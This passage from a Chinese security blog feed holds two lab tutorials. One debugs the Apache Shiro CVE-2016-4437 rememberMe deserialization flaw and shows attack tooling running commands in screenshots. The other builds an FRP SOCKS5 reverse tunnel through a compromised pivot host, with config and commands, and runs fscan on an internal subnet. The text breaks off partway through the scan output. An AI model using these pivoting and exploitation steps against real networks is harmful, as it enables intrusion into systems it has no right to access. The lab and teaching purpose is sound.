src="https://img-blog.csdnimg.cn/d6649bdbd90e4ab68117bcee444c8ba6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">4、等待 IDEA 自动下载并导入完项目依赖的包，build 完成后项目结构如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/c80d0dee92f343598408ae429166095b.png" alt="在这里插入图片描述" loading="lazy">注意，pom.xml 里面的配置会让程序自动下载<code>shiro-core</code>依赖包（后面程序加断点调试会用到该部分文件）：<br><img src="https://img-blog.csdnimg.cn/8089e47848bc4c99998997e9647c07f3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>5、接着设置 <code>run/debug configurations</code>， 添加本地 Tomcat 环境（需要提前在本地安装 Tomcat 环境）：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/cf6e74b611ee4d9cb442d6cb580011d7.png" alt="在这里插入图片描述" loading="lazy"> 6、添加项目 War 包 <code>samples-web.war</code>进 Tomcat 中：<br> <img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/eb7193051ac649e1a84754c95304456e.png" alt="在这里插入图片描述" loading="lazy">附：此处该 War 包之所以存在，是因为它也是前面 pom.xml 配置文件设置的自动下载到本地的：<br> <img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/cdee004cf6cc482eba35cf2029829ebb.png" alt="在这里插入图片描述" loading="lazy">7、配置完以上的准备工作，就可以直接 run 运行程序了：<br> <img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/f788bd07bf114fd08b52ea1da27eaefc.png" alt="在这里插入图片描述" loading="lazy">运行成功后浏览器将自动打开目标程序站点，本地环境部署至此结束：<br> <img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/4b28af311e8e4422a486991775d6023a.png" alt="在这里插入图片描述" loading="lazy">8、访问登录页面进行已提示账户的登录，抓包可见 remenberme 字段：<br> <img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/f79e66769e594faa87b260f0725df38b.png" alt="在这里插入图片描述" loading="lazy"><img src="https://img-blog.csdnimg.cn/c0f1974110a74d63bc812fce292f154d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">9、为了开始调试该程序，先停止程序运行，然后在 <code>External Libraries</code> 中找到 shiro-core-1.2.4 的 jar 包，打开 <code>RememberMeManager.class</code> 文件并在 onSuccessfulLogin 函数前加断点，然后点击 Debug 按钮开始在调试模式下运行程序：<br> <img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/1f6bce5bdc5d4d7aaa92dfebf54830b4.png" alt="在这里插入图片描述" loading="lazy">10、接着在 Web 端登录账户 root/secret，勾选上 Remember Me 的按钮，程序会停在断点处，然后便可以开始正式的 Debug 漏洞调试了：<br> <img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/40edf49ee666483d97e9861c30622bef.png" alt="在这里插入图片描述" loading="lazy"><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/49e7f80fd6ce484f95158dd51abaf9ec.png" alt="在这里插入图片描述" loading="lazy">11、以上项目工程相当于是只导入 samples-web 文件夹，实际上也可以直接在 IDEA 导入在 Github 下载的完整的 shiro-shiro-root-1.2.4 源码工程文件夹，待 Build 自动下载完所需的依赖包后，同样的步骤配置 Tomcat，然后直接找到 core 文件夹下的<code>RememberMeManager.java</code> 文件并在 onSuccessfulLogin 函数前加断点：<br> <img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/8c8581e57bfc4cf4a3a590089e423dc2.png" alt="在这里插入图片描述" loading="lazy">12、接着在 Debug 模式下运行程序，也可在断点处拦截程序、进行调试：<br> <img src="https://img-blog.csdnimg.cn/753d1bdd3c3644d4914a7b3969045cad.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">后面的审计分析将基于上述导入所有项目源码的工程项目，因为相比于第一种仅导入 samples-web 文件夹并通过引入shiro-core-1.2.4 的 jar 包来调试 class 文件的方式，直接审计全部 java 源码将更为直观！</p><h2 id="序列化过程分析"><a href="#序列化过程分析" class="headerlink" title="序列化过程分析"></a>序列化过程分析</h2><p>下面开始正式调试分析 Apache Shiro 框架在登录过程生成序列化 Cookie对象的过程。</p><p>1、首先看下登录请求发送后断点停留的 onSuccessfulLogin 函数：<br><img src="https://img-blog.csdnimg.cn/73acb23c58e942b2a4174e836af67d72.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">程序首先调用 forgetIdentity 构造方法处理 request 和 response 请求，包括在 response 中加入 cookie 信息，然后调用 rememberIdentity 函数，来处理 cookie 中的 rememberme 字段。</p><p>2、我们按 F8 来 Step Over 跨过 forgetIdentity 构造方法，然后 F7 来 Step Into 跟进下 rememberIdentity 函数：<br><img src="https://img-blog.csdnimg.cn/7b9609bc8adf4325a52de6451724f51a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">可以看到，rememberIdentity 函数首先调用 getIdentityToRemember 函数来获取用户身份，这里也就是”root”。</p><p>3、接着我们跟进 rememberIdentity 构造方法：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/5ec3cf0b782b4ba3a3b642278df1e5d8.png" alt="在这里插入图片描述" loading="lazy">4、上面调用了 convertPrincipalsToBytes 方法将 accountPrincipals 也就是 “root” 转换为字节形式，跟进该方法查看内部如何转换：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/235318db40574f69b13b717c0b237349.png" alt="在这里插入图片描述" loading="lazy">5、转换过程是先序列化用户身份 “id” ，再对其进行 encrypt 加密，进一步跟进 encrypt 函数查看加密方式：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/9ee4baad44f2416da5451a6524e52e55.png" alt="在这里插入图片描述" loading="lazy">6、encrypt 函数就是调用 AES 加密对序列化后的 “root” 进行加密，加密的密钥由 getEncryptionCipherKey() 得到，跟进 getEncryptionCipherKey() 函数会发现其值为常量（即密钥硬编码）：<br><img src="https://img-blog.csdnimg.cn/4d14b8f6eb544b69a856d7bf5fa0bb23.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">7、Shift+F8 进行 Step Out 步出，返回到 rememberIdentity 函数：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/459933640c3549a080b7432e8521c9d5.png" alt="在这里插入图片描述" loading="lazy"><br>8、跟进 rememberSerializedIdentity 函数查看后续转换流程，发现该函数对上述 root 的 AES 加密后的序列化值进行 base64 编码后，设置到cookie中：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/d13228bd3a264e1287453b0de327720b.png" alt="在这里插入图片描述" loading="lazy">到这里我们可以梳理下上述整个 Cookie 的生成过程，当我们勾选上  Remember Me 选项框后，以 root 身份登录，后端会进行如下操作：</p><ol><li>序列化用户身份”root”，得到值 A；</li><li>对 root 的序列化值 A 进行 AES 加密（密钥为硬编码的常量），得到值 B；</li><li>base64 编码上述计算的结果 B，得到值 C；</li><li>将值 C 设置到 response 响应包中 cookie 的 rememberme 字段。</li></ol><p>可以看看整个数据包：<br><img src="https://img-blog.csdnimg.cn/c0f1974110a74d63bc812fce292f154d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="反序列化的分析"><a href="#反序列化的分析" class="headerlink" title="反序列化的分析"></a>反序列化的分析</h2><p>以上已经调试分析完 Shiro 生成 Cookie 字段的序列化、加密过程，下面来进一步调试分析下 Cookie 字段的反序列化、解密过程。</p><p>1、将断点打在<code>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</code>函数处，然后发送一个带有 rememberMe Cookie 的请求：<br><img src="https://img-blog.csdnimg.cn/c79e5406d7b048ebb5d9de0d510891c4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>2、跟进查看 getRememberedPrincipals 函数：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/98fbc3183ad44157988686ebaf712d1e.png" alt="在这里插入图片描述" loading="lazy"><br>3、跟进 getRememberedSerializedIdentity 函数，发现函数提取出 cookie 并将其进行 base64 解码：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/db03f21566644232a1e5420734c5e4d9.png" alt="在这里插入图片描述" loading="lazy">4、Step Out 返回到 getRememberedPrincipals 函数，继续跟进到 convertBytesToPrincipals 函数，发现其对 cookie 进行 AES 解密和反序列化：<br><img src="https://img-blog.csdnimg.cn/31849a60ffb8441fac6c7199067c817a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">5、同理再依次跟进查看 AES 解密函数 decrypt、反序列化函数 deserialize，如下：<br><img src="https://img-blog.csdnimg.cn/9b205fc0ff9040a5a303c10108d05f22.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/6bf234c7443b44018c5764741dfd18e1.png" alt="在这里插入图片描述" loading="lazy">至此 Cookie 的反序列化、解密流程分析完毕，整个流程大致为：</p><ol><li>读取 cookie 中 rememberMe 值；</li><li>base64 解码；</li><li>AES解密；</li><li>反序列化</li></ol><p>其中 AES 加解密的密钥为常量 且 反序列化过程没有进行过滤，于是我们可以手动构造 rememberMe 值，改造其 readObject() 方法，让其在反序列化时执行任意操作。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>在前面的一篇文章：<a href="https://bwshen.blog.csdn.net/article/details/109269859">Apache Shiro Java反序列化漏洞复现</a> 已经介绍了如何手工构造 Payload 对此处的反序列化漏洞进行利用，下面简单演示下利用  <a href="https://github.com/j1anFen/shiro_attack">shiro_attack-2.0</a> 工具进行自动化攻击。</p><p>1、如下图，依次爆破密钥和检测构造链：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/a010bff13b0b4b16ae6f17b8838f26f1.png" alt="在这里插入图片描述" loading="lazy">2、利用反序列化漏洞成功执行任意命令：<br><img src="https://img-blog.csdnimg.cn/e0a5b4279a5340789275c33fdf779f2c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>【注意】 如果是直接导入 samples-web 文件夹建立工程项目的话，会导致攻击失败：<br><img src="https://img-blog.csdnimg.cn/66f00111e73442ad867148b25cb8557b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>因为 shiro550 自带的包是 commons-collections3.2.1，原生情况下直接用 ysoserial 打，是不会成功的（这是因为 CommonsCollections3.2.1 用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在 shiro 的环境下，可以正确执行命令）：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/5681c04849a64475b429b126f9cd7954.png" alt="在这里插入图片描述" loading="lazy"><br>需要修改 pom.xml，添加 commons-collections4 依赖包：<br><img src="https://img-blog.csdnimg.cn/1954fdc9927d4f6bb752e881f18e62ea.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">重新 Build 一下项目，确认已下载上述依赖包：<br><img src="https://img-blog.csdnimg.cn/5c180d619dbd4402b578400f63047bcf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>随后即可成功攻击利用：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2bda9df91577488aaee012dc4cef76dd.png" alt="在这里插入图片描述" loading="lazy"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文是调试分析 CVE 漏洞的第一篇，遇到了很多坑点，但也学到了不少东西，继续努力吧！</p><p>最后说一下，CVE-2016-4437 漏洞主要的修复方案：</p><ol><li>升级 shiro 到最新版本；</li><li>如果在配置里配置了密钥，那么请一定不要使用网上的密钥， 一定不要！请自己base64一个AES的密钥，或者利用官方提供的方法生成密钥：org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()。</li></ol><p>本文参考文章：</p><ol><li><a href="https://saucer-man.com/information_security/396.html">分析调试apache shiro反序列化漏洞(CVE-2016-4437)</a>；</li><li><a href="http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/">Shiro 反序列化记录 </a>。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在前面的一篇文章：&lt;a href=&quot;https://bwshen.blog.csdn.net/article/details/1092698</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://tr0e.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>基于FRP反向代理工具实现内网穿透攻击</title>
    <link href="https://tr0e.github.io/%E5%9F%BA%E4%BA%8EFRP%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%94%BB%E5%87%BB/"/>
    <id>https://tr0e.github.io/%E5%9F%BA%E4%BA%8EFRP%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%94%BB%E5%87%BB/</id>
    <published>2021-07-14T16:27:33.000Z</published>
    <updated>2022-06-15T15:50:53.021Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当我们拿下目标单位的一台外网服务器后，需要借助外网服务器作为跳板机去开展内网渗透，这个时候必不可少的就是在跳板机上设置代理。在前面的文章中，曾经在实际案例中介绍了两种代理方式：</p><ol><li>Webshell 管理工具——冰蝎直接设置 HTTP 隧道代理实现内网穿透：<a href="https://bwshen.blog.csdn.net/article/details/118066125">2021强网杯全国网络安全挑战赛Writeup</a>；</li><li>Cobaltstrike 建立 Socks4 代理实现内网穿透：<a href="https://bwshen.blog.csdn.net/article/details/118243520">Cobaltstrike内网渗透神器入门使用教程</a>。</li></ol><p>以上两种代理方式虽均能实现内网穿透的目的，但是代理质量相对来说并不稳定，难以满足内网渗透的需求。本文将介绍一个专注于内网穿透的高性能的反向代理应用——FRP，其支持 TCP、UDP、HTTP、HTTPS 等多种协议，可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p><h1 id="FRP反向代理"><a href="#FRP反向代理" class="headerlink" title="FRP反向代理"></a>FRP反向代理</h1><p>FRP 的 <a href="https://gofrp.org/docs/overview/">中文官方文档</a> 可了解其作用和用法。</p><p>简而言之，FRP 通过在具有公网 IP 的节点上部署 frp 服务端，可以轻松地将内网服务穿透到公网，同时提供诸多专业的功能特性，这包括：</p><ol><li>客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。</li><li>采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间。</li><li>代理组间的负载均衡。</li><li>端口复用，多个服务通过同一个服务端端口暴露。</li><li>多个原生支持的客户端插件（静态文件查看，HTTP、SOCK5 代理等），便于独立使用 frp 客户端完成某些工作。</li><li>高度扩展性的服务端插件系统，方便结合自身需求进行功能扩展。</li><li>服务端和客户端 UI 页面。</li></ol><h2 id="内网环境搭建"><a href="#内网环境搭建" class="headerlink" title="内网环境搭建"></a>内网环境搭建</h2><p>本文将借助以下靶场环境进行 FRP 工具实现内网穿透的实验演示：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714204507992.png" alt="在这里插入图片描述" loading="lazy"><br>没错，以上环境基于红日安全 Vulnstack 内网靶场环境，详情可参见<a href="https://bwshen.blog.csdn.net/article/details/118353886">Vulnstack红日安全内网域渗透靶场1实战</a>。</p><p>1、由于虚拟机仅主机模式下默认是可与物理机连通的，故在 Win2008 域控主机上，防火墙新建了如下入站规则来拒绝 Win10 物理机的访问（禁止访问的 IP 为物理机的仅主机模式 VMnet1 网卡的网关 <code>192.168.52.1</code>）：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714205808292.png" alt="在这里插入图片描述" loading="lazy">2、此时 Win7 跳板机访问 Win2008 的 80 端口 Web 服务是正常的：<br><img src="https://img-blog.csdnimg.cn/20210714210302525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">3、但是“外网”角色的 Win10 物理机则无法正常访问 Win2008 的 Web 服务：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714210854223.png" alt="在这里插入图片描述" loading="lazy">4、而同样是与物理机做了仅主机模式网络连接的 Win2003 虚拟机，由于没有做防火墙策略，Win10 物理机是可以直接连通的：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714210952395.png" alt="在这里插入图片描述" loading="lazy"><br>以上就是本次实验的演示环境，接下来我的目标就是借助 FRP 反向代理工具，实现 Win10 物理机通过 Win7 跳板机的代理成功访问到内网 Win2008 的 Web 服务！</p><h2 id="服务端的配置"><a href="#服务端的配置" class="headerlink" title="服务端的配置"></a>服务端的配置</h2><p>FRP 代理工具可以直接在<a href="https://github.com/fatedier/frp"> Github下载 </a>：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714211753826.png" alt="在这里插入图片描述" loading="lazy">从下图的 frp 架构图可以看出 frp 的工作流程——在服务端部署 frps，在要访问的 内网机器（或者跳板机）上部署 frpc，实现服务端对该主机的反向代理，接着便可以通过访问服务端来实现对该内网主机的远程访问（或者借助跳板机访问内网）：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714213306995.png" alt="在这里插入图片描述" loading="lazy"><br>1、下载 <code>frp_0.37.0_linux_amd64.tar.gz</code> 并传输到 VPS 服务器上后解压缩获得如下文件：<br><img src="https://img-blog.csdnimg.cn/20210714215638153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">其中的关键文件如下：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">├── frpc          #frp客户端执行程序├── frpc_full<span class="token punctuation">.</span>ini ├── frpc<span class="token punctuation">.</span>ini      #frp客户端配置文件├── frps          #frp服务端执行程序├── frps_full<span class="token punctuation">.</span>ini├── frps<span class="token punctuation">.</span>ini      #frp服务端配置文件└── <span class="token constant">LICENSE</span></code></pre><p>2、frp 服务默认不设置连接密码，frps.ini 文件默认只设置了端口：<br><img src="https://img-blog.csdnimg.cn/20210714221112908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>我们可以修改服务端配置文件<code>frps.ini</code>来配置代理的连接密码，如下图所示：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714221641412.png" alt="在这里插入图片描述" loading="lazy"><br>3、执行命令<code>./frps -c ./frps.ini</code>开始运行 FRP 服务：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714221811611.png" alt="在这里插入图片描述" loading="lazy"></p><h2 id="客户端的配置"><a href="#客户端的配置" class="headerlink" title="客户端的配置"></a>客户端的配置</h2><p>1、将对应版本的 FRP 工具下载到 Win7 跳板机上并解压缩，客户端配置文件<code>frpc.ini</code>初识参数如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714222351496.png" alt="在这里插入图片描述" loading="lazy">2、同样的修改 FRP 客户端配置文件<code>frpc.ini</code>来设置服务端的 IP 地址、端口、连接密码：<br><img src="https://img-blog.csdnimg.cn/20210714230546382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>参数释义：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>server_addr <span class="token operator">=</span> <span class="token number">104.168</span><span class="token punctuation">.</span><span class="token operator">**</span><span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">**</span><span class="token operator">*</span> #<span class="token constant">VPS</span>服务器的 <span class="token constant">IP</span>server_port <span class="token operator">=</span> <span class="token number">7000</span>            #<span class="token constant">VPS</span>服务器上设置的 <span class="token constant">FRP</span> 服务绑定端口token <span class="token operator">=</span> ftp1234               #<span class="token constant">VPS</span>服务端设置的 <span class="token constant">FRP</span> 服务连接密码<span class="token punctuation">[</span>socks5<span class="token punctuation">]</span>      #这个是反向代理的名称，可以随意设置type <span class="token operator">=</span> tcp    #socks5 是 <span class="token constant">TCP</span> 协议的remote_port <span class="token operator">=</span> <span class="token number">6666</span>   #指定建立的反向代理的连接端口plugin <span class="token operator">=</span> socks5      #指定建立 socks5 代理隧道use_encryption <span class="token operator">=</span> <span class="token boolean">true</span>use_compression <span class="token operator">=</span> <span class="token boolean">true</span></code></pre><p>3、接下来执行命令<code>frpc.exe -c frpc.ini</code>启动客户端即可：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714230731824.png" alt="在这里插入图片描述" loading="lazy"></p><p>4、此时查看 VPS 服务器监听的 7000 端口已成功与客户端连接，同时开启了 6666 端口并建立了 socks5 代理通道：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714230753313.png" alt="在这里插入图片描述" loading="lazy"></p><h2 id="FRP内网穿透"><a href="#FRP内网穿透" class="headerlink" title="FRP内网穿透"></a>FRP内网穿透</h2><p>配置完 FRP 服务端和客户端并建立起 socks5 隧道后，下面就来见证下利用该 FRP 代理隧道如何穿透内网！</p><p>1、在 Win10 物理机的谷歌浏览器设置如下代理：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714230838186.png" alt="在这里插入图片描述" loading="lazy">2、然后让 Win10 的谷歌浏览器流量走 VPS 建立的 FRP socks5 代理，即可访问到内网域控主机的 Web 服务，成功实现内网穿透！<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714230940868.png" alt="在这里插入图片描述" loading="lazy">返回 VPS 也能查看到对应流量转发的信息：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714231007684.png" alt="在这里插入图片描述" loading="lazy">3、以上除了在浏览器直接连接  frp 的 socks5 代理外，在实际渗透过程中为了结合 BurpSsuite 对内网 Web 系统进行抓包测试，还可以在浏览器连接 BurpSuite 代理，并在 BurpSuite 中设置流量走  frp 服务器的 socks5 代理即可，如下图所示：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714232053459.png" alt="在这里插入图片描述" loading="lazy">4、此时谷歌浏览器挂着 BurpSuite 的代理便可以访问到内网的服务了：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714232326188.png" alt="在这里插入图片描述" loading="lazy">同时 BurpSuite 也能抓到内网服务的数据包了：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210714232514553.png" alt="在这里插入图片描述" loading="lazy">至此已成功借助 frp 搭建 socks5 代理隧道、实现内网穿透的目的！</p><h2 id="FRP进阶使用"><a href="#FRP进阶使用" class="headerlink" title="FRP进阶使用"></a>FRP进阶使用</h2><p>上文搭建的 socks5 隧道用于将公网主机（本文代指 Win10 物理机）访问内网服务器的请求流量直接通过访问 Win7 跳板机转发，从而实现内网穿透的目的。</p><p>FRP 反向代理还可以将内网主机的 22、3389 等端口转发到公网主机的指定端口，从而实现远程连接内网服务器的目的，如下图所示：<br><img src="https://img-blog.csdnimg.cn/20210714234516370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>相关用法请参见前文提及的 FRP 的 <a href="https://gofrp.org/docs/overview/">中文官方文档</a>，此处不再演示。</p><h1 id="fscan内网神器"><a href="#fscan内网神器" class="headerlink" title="fscan内网神器"></a>fscan内网神器</h1><p>此处搞点跟本文题目无关的题外知识hh，某次攻防演习看到同事使用了 fscan 扫描内网的服务，被秀了一把，不得不感叹真香！在此顺便借助该靶场环境记录下该工具的用法。</p><p>Fscan 工具的 <a href="https://github.com/shadow1ng/fscan">Github 项目地址</a>，有使用说明：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210715000327929.png" alt="在这里插入图片描述" loading="lazy"></p><p>可直接下载：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210715000231367.png" alt="在这里插入图片描述" loading="lazy">简单用法：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210715000407182.png" alt="在这里插入图片描述" loading="lazy">下面来体验下该工具，看看实际的使用效果！</p><p>1、拿到 Win7 跳板机的 Shell：<br><img src="https://img-blog.csdnimg.cn/20210715000545874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">2、上传 fscan64.exe 文件到跳板机上：<br><img src="https://img-blog.csdnimg.cn/20210715000923588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">3、在 Cknife 中打开命令终端，执行命令<code>fscan64.exe -h 192.168.52.0/24 -o result.txt</code>，进行内网信息探测：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210715001156701.png" alt="在这里插入图片描述" loading="lazy"><br>4、下载并打开程序运行结果 result.txt，可以看到如下搜集到的全面的内网信息：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210715001321890.png" alt="在这里插入图片描述" loading="lazy">附上所有结果：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">192.168</span><span class="token 